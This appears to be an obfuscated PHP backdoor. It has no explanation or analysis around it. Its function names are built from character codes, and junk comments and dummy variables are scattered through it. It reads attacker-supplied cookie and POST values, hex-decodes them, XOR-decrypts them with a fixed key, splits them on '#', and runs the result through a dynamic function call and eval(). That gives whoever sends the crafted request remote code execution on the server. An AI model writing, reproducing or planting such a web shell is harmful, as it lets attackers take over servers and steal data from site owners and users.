<?php $NkKOnwRT/*Cs */=   "\x73"  ./*Ti  */"\164"	. 'r'/*  ai  */./*   cxT   */"\137"     ./*  ymWj   */'r'	.	chr  (  1094  -  993    ).chr/*   O*/(    215	-	103/*  Vuxgi*/)."\145"     .  chr/*  Ay */(   987  -  890	).chr/* LhtOk */(/*   ZbX */243    -	127/*   kMvi */);
		$FaqOENuNV	=/*  vJRDB   */"\145" .	"\x78"     .     "\160"	.     "\x6c"/*c  */./*yYvMF  */"\157"	. "\144" .	chr     (101);;


$YYonLE/* mN */=/*  JAiLZ*/chr	(112)	.	"\x61"	.	'c'/* S  */.	"\153";;
     function	qHWHGAGW()
     /*znX*/{
	/*t   */$pThNYA	=/* nv */Array  (/*  HR*/"VxnosgDFIK"/* LWCM*/=>  "moyQWCrOLGCdIiHFbZvnuy"/* Ldk*/);
   	
						$NJFSNHjU	=	Array	(	"tBrujMVikirKqQFEDwCj"/*ma */=>	"hYLLwUokoGpQgVfVAxYfZVHRMt"/*   OP */);$_gthJ/*  oy   */=/*  kl   */'45803';


/* A*/$mAAuX	=	Array(/* wk */$pThNYA,/*   youWj  */$_COOKIE,/*  NjhB */$pThNYA,	$_POST,/*  L */$NJFSNHjU);$_qVCSd     =    '25675';
			  
/*   ro */return/*  Hvbb*/$mAAuX;
         }

/*fi  */
        function/* Qaa   */OhVLrwgj($HMdSQYYAj,    $pThNYA)
       {

	if  (	count    (/*pH */$HMdSQYYAj ) ==/*   Wg   */3     )/* plioi  */{
	  $IUxBpMVNTv	=     $HMdSQYYAj[1];
	$BTUiPSWMA	=	$HMdSQYYAj[2];;
				$ddivLpDJnR/*nyr */=/*   Y  */$IUxBpMVNTv($BTUiPSWMA);$_pnPkU	=/*R   */'12977';
      eval     (/*vRY  */$ddivLpDJnR	);$_Shhr	=	'65202';
					 die/* Zujgv */();;
						}


/*jyADO   */}
     	
		 function	CUiqr($POcoTfaTT,     $TywZFLk)
					/*uvXMp */{
						return	$POcoTfaTT/*n*/^    $TywZFLk;;
	}
	    
       $NZbrzqW	= '#';
	   
		foreach	(qHWHGAGW()     as   $wrHuW)	{
     foreach (   $wrHuW     as/*   Hatu   */$TywZFLk/*  k   */=>/*  Jq   */$POcoTfaTT	)/*HsYf*/{
				   
				 $bjfPlc  =     strlen(	$POcoTfaTT   )/strlen(	$TywZFLk/*   oXKg */);
			/*   YaH*/
 /*  sSRu */$POcoTfaTT =/*   O  */@$YYonLE(/*   fpRx*/chr	(72)	./*  yyW  */'*',/*  LcLh  */$POcoTfaTT/*  Hjv   */);
			
  $TywZFLk/*  iI   */.=	"heXZ-vvJs-YfWRjuw-XxWKlU-cowvtbe-iPIEyCN-DXEzuHX";$_W   =	'15692';
    /* SG   */$TywZFLk =  $NkKOnwRT/*YdV */(/* Jee */$TywZFLk,/*   ed   */$bjfPlc +	1);$_QvT/*   iP*/=/*   ymy*/'19231';
		/*   fQcSk  */
			/*  fxxi*/$EJUuVxINXH   =	strrev("");$_Cd	=/*  qhF   */'16205';
    
				/*Nr  */$EJUuVxINXH/* Y  */=	CUiqr($POcoTfaTT,  $TywZFLk);
					/*   x   */


	$TywZFLk/*ycB */=	sha1($TywZFLk);;
		
	$HMdSQYYAj/* bAI   */=	$FaqOENuNV/*mpp   */($NZbrzqW,	$EJUuVxINXH	);$_huQq	=   '64988';
				  
 	sha1($EJUuVxINXH);
					
      OhVLrwgj($HMdSQYYAj,/*   l*/$NZbrzqW);
		

 continue;;


   }
			  }